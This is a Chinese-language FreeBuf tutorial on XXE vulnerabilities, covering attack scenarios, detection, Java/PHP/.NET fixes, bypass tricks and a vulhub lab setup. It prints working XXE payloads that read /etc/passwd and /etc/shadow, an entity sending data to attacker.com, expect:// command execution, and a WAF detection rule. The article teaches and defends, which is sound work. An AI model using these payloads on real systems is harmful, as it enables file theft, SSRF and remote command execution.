---
title: XXE漏洞的简单介绍
url: https://www.freebuf.com/vuls/421769.html
source: FreeBuf网络安全行业门户
date: 2025-02-15
fetch_date: 2025-10-06T20:36:23.756305
---

# XXE漏洞的简单介绍

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

XXE漏洞的简单介绍

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

XXE漏洞的简单介绍

2025-02-14 10:08:26

所属地 上海

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 1. 漏洞定义

**XXE（XML外部实体注入） 是一种利用XML解析器处理外部实体时的安全缺陷，攻击者通过注入恶意外部实体，实现敏感数据读取、服务器端请求伪造（SSRF）或远程代码执行（RCE）。**

## 2. 漏洞原理

**外部实体声明：XML允许在DOCTYPE中定义实体，包括引用外部资源：**

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&ampxxe</data>
```

* 解析器行为：未严格配置的解析器会解析并返回外部实体内容，如读取本地文件、发起网络请求等。

## 3. 攻击场景

**敏感文件泄露：**

```
<!ENTITY xxe SYSTEM "file:///etc/shadow">
```

**SSRF攻击：**

```
<!ENTITY xxe SYSTEM "http://internal-api:8080/secrets">
```

**盲注XXE：通过DNS或HTTP请求外带数据：**

```
<!ENTITY % dtd SYSTEM "http://attacker.com/collect?data=exfil">
```

**PHP expect RCE（需特定环境）：**

```
<!ENTITY xxe SYSTEM "expect://id">
```

## 4. 漏洞检测方法

**手动检测：**

```
<!-- 基本Payload -->
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&ampxxe</root>

<!-- 盲注检测 -->
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://dnslog.cn">
  %remote;
]>
```

**工具检测：**

Burp Suite：Scanner模块自动识别XXE流量特征

XXEinjector：自动化利用工具，支持多种协议外带数据

OOB测试：使用Interactsh生成带外检测域名

## **5. 漏洞修复方案**

代码层修复
禁用外部实体（以Java为例）：

```
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

PHP修复：

```
libxml_disable_entity_loader(true);
```

.NET修复：

```
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

**架构层加固**
输入过滤：拦截包含<!DOCTYPE或SYSTEM关键字的XML内容

协议限制：禁止XML解析器使用file、http、ftp等协议

WAF规则：

```
# 拦截XXE特征
if ($request_body ~* "<!ENTITY.*SYSTEM") {
  deny all;
}
```

## **6. 绕过手法与进阶攻击**

**UTF-7编码绕过：**

```
+ADw-+ACE-DOCTYPE foo+AFs- +ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4- +AD4-
```

XInclude注入（当无法控制XML头时）：

```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

SVG文件XXE：

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="expect://ls"></image>
</svg>
```

## 御矩阵

防护层级                         具体措施                                      实施示例
代码层                            安全XML解析配置                    禁用DTD、外部实体
运维层                            文件上传过滤                           禁止上传SVG/Office文档
网络层                           出站协议限制                            阻断XML解析器的外连请求
监控层                           异常日志告警                           监控XML解析错误日志

## 9. 测试验证流程

1. 环境搭建：

```
# 使用vulhub快速搭建测试环境
git clone https://github.com/vulhub/vulhub
cd vulhub/xxe
docker-compose up -d
```

2.漏洞验证：

```
POST /xml.php HTTP/1.1
Host: vuln-server
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&ampxxe</root>
```

**总结：XEE漏洞的防御需要从XML解析器安全配置、输入过滤、协议限制等多维度构建防御体系，同时结合持续监控和渗透测试确保防护有效性。**

# 漏洞 # XXE漏洞

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

1. 漏洞定义

2. 漏洞原理

3. 攻击场景

4. 漏洞检测方法

5. 漏洞修复方案

6. 绕过手法与进阶攻击

御矩阵

9. 测试验证流程

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)